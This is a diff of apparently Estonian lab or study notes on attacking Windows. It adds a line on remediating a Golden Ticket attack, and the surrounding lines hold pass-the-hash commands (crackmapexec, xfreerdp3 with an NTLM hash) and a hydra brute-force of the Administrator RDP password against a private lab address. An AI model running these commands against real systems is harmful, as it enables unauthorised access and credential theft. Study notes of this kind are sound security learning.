@@ -143,6 +143,9 @@ crackmapexec smb 192.168.1.2 -u "Administrator" -H "c625e3e2756d9ef01881fa7ed46b
   Registri väärtuse kirjapilt on oluline
 sudo xfreerdp3 /v:192.168.1.2 /u:Administrator /pth:c625e3e2756d9ef01881fa7ed46b49a8 /restricted-admin (loome rdp ühenduse)
 
+Golden Ticket Fix:
+4 korda parooli vahetust kui on kahtlus
+
 hydra -V -f -l Administrator -P /home/user/Documents/rockyou.txt rdp://192.168.1.2 (Proovime kräkida Administraator parooli)
 
 
